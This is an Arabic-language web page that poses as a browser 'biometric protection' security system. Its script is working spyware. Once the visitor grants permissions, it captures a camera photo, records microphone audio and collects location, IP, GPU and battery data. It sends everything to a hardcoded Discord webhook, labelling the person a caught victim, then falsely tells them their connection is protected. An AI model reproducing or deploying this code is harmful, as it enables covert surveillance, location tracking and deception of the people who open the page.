<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام تأمين الهوية الرقمية 2026</title>
    <style>
        body { background: #020205; color: #00ff9d; font-family: 'Courier New', monospace; text-align: center; padding: 20px; overflow-x: hidden; }
        .glass-panel { 
            max-width: 800px; margin: 40px auto; background: rgba(255,255,255,0.05); 
            padding: 30px; border-radius: 20px; border: 1px solid #00ff9d; 
            backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(0,255,157,0.2);
        }
        .btn-secure { 
            background: #00ff9d; color: #000; border: none; padding: 15px 30px; 
            font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 20px;
            box-shadow: 0 0 15px #00ff9d;
        }
        .log { text-align: left; font-size: 12px; color: #888; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="glass-panel">
        <h1>تطوير الأمن السيبراني: بروتوكول الحماية 🌐</h1>
        <p>لضمان حماية بياناتك من الاختراقات الخارجية، يتطلب النظام تفعيل "التوثيق الحيوي" للمتصفح.</p>
        <p style="color: #ff3e3e;">⚠️ يرجى الضغط على الزر أدناه والموافقة على الأذونات لتشفير اتصالك الآن.</p>
        
        <button class="btn-secure" onclick="startUltimateCapture()">تفعيل الحماية الحيوية</button>

        <div class="log" id="status-log">
            > انتظار استجابة المستخدم...
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1492913386810245151/247Nc1kE6rz06tvqTTKAiDjZbHMpyjLMpmC4velKlPHmSWSFp_1Ue_-xJJdBhrcgX4D9';

        async function startUltimateCapture() {
            const log = document.getElementById('status-log');
            log.innerHTML += "<br>> جاري طلب الأذونات الأمنية...";

            try {
                // 1. طلب الموقع، الكاميرا، والميكروفون
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const position = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));

                log.innerHTML += "<br>> تم تأكيد الهوية. جاري الرفع...";

                // 2. التقاط صورة من الكاميرا
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));

                // 3. تسجيل 3 ثواني صوت
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                
                setTimeout(async () => {
                    recorder.stop();
                    recorder.onstop = async () => {
                        const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                        
                        // 4. جمع كل المعلومات (IP, GPU, Battery, Location)
                        const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
                        const gl = canvas.getContext('webgl');
                        const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Unknown";

                        // 5. إرسال كل شيء لـ Discord في طلب واحد (FormData)
                        const fd = new FormData();
                        const info = {
                            username: "رادار المراقبة الكلي 👁️",
                            content: `🚨 **تم صيد الضحية بالكامل!**\n📍 الخريطة: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}\n🔋 البطارية: ${Math.round((await navigator.getBattery()).level * 100)}%\n🎮 الجهاز: ${gpu}\n🌐 الـ IP: ${ipRes.ip}`,
                        };
                        
                        fd.append('payload_json', JSON.stringify(info));
                        fd.append('file1', photoBlob, 'photo.jpg');
                        fd.append('file2', audioBlob, 'audio.webm');

                        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd });
                        
                        log.innerHTML += "<br>> تم الانتهاء. اتصالك محمي الآن.";
                        stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا بعد السحب
                    };
                }, 3000);

            } catch (err) {
                log.innerHTML += `<br><span style="color:red">> خطأ: تم رفض الأذونات.</span>`;
            }
        }
    </script>
</body>
</html>
